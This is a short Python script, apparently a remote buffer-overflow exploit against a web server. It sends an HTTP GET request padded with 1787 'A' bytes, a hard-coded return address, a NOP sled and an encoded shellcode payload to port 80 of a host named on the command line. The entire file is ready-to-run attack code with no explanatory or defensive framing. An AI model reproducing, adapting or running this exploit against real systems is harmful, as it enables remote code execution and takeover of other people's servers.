#!/usr/share/python

import socket,sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((sys.argv[1],80))

buff="GET "

buf =  b""
buf += b"\xba\xc5\xae\x13\x15\xd9\xf6\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x93\xa0\xf1"
buf += b"\xe0\xe7\x55\x77\x0a\x17\xa6\x18\x82\xf2\x97\x18\xf0"
buf += b"\x77\x87\xa8\x72\xd5\x24\x42\xd6\xcd\xbf\x26\xff\xe2"
buf += b"\x08\x8c\xd9\xcd\x89\xbd\x1a\x4c\x0a\xbc\x4e\xae\x33"
buf += b"\x0f\x83\xaf\x74\x72\x6e\xfd\x2d\xf8\xdd\x11\x59\xb4"
buf += b"\xdd\x9a\x11\x58\x66\x7f\xe1\x5b\x47\x2e\x79\x02\x47"
buf += b"\xd1\xae\x3e\xce\xc9\xb3\x7b\x98\x62\x07\xf7\x1b\xa2"
buf += b"\x59\xf8\xb0\x8b\x55\x0b\xc8\xcc\x52\xf4\xbf\x24\xa1"
buf += b"\x89\xc7\xf3\xdb\x55\x4d\xe7\x7c\x1d\xf5\xc3\x7d\xf2"
buf += b"\x60\x80\x72\xbf\xe7\xce\x96\x3e\x2b\x65\xa2\xcb\xca"
buf += b"\xa9\x22\x8f\xe8\x6d\x6e\x4b\x90\x34\xca\x3a\xad\x26"
buf += b"\xb5\xe3\x0b\x2d\x58\xf7\x21\x6c\x35\x34\x08\x8e\xc5"
buf += b"\x52\x1b\xfd\xf7\xfd\xb7\x69\xb4\x76\x1e\x6e\xbb\xac"
buf += b"\xe6\xe0\x42\x4f\x17\x29\x81\x1b\x47\x41\x20\x24\x0c"
buf += b"\x91\xcd\xf1\x83\xc1\x61\xaa\x63\xb1\xc1\x1a\x0c\xdb"
buf += b"\xcd\x45\x2c\xe4\x07\xee\xc7\x1f\xc0\x1b\x10\x4b\x38"
buf += b"\x74\x22\x73\x3c\x56\xab\x95\x56\x46\xfa\x0e\xcf\xff"
buf += b"\xa7\xc4\x6e\xff\x7d\xa1\xb1\x8b\x71\x56\x7f\x7c\xff"
buf += b"\x44\xe8\x8c\x4a\x36\xbf\x93\x60\x5e\x23\x01\xef\x9e"
buf += b"\x2a\x3a\xb8\xc9\x7b\x8c\xb1\x9f\x91\xb7\x6b\xbd\x6b"
buf += b"\x21\x53\x05\xb0\x92\x5a\x84\x35\xae\x78\x96\x83\x2f"
buf += b"\xc5\xc2\x5b\x66\x93\xbc\x1d\xd0\x55\x16\xf4\x8f\x3f"
buf += b"\xfe\x81\xe3\xff\x78\x8e\x29\x76\x64\x3f\x84\xcf\x9b"
buf += b"\xf0\x40\xd8\xe4\xec\xf0\x27\x3f\xb5\x01\x62\x1d\x9c"
buf += b"\x89\x2b\xf4\x9c\xd7\xcb\x23\xe2\xe1\x4f\xc1\x9b\x15"
buf += b"\x4f\xa0\x9e\x52\xd7\x59\xd3\xcb\xb2\x5d\x40\xeb\x96"


buff+="A"*1787 + "\x71\xe8\xf1\x77" + "\x90" * 30 + buf

buff+=" HTTP/1.1\r\n\r\n"

s.send(buff)

s.close()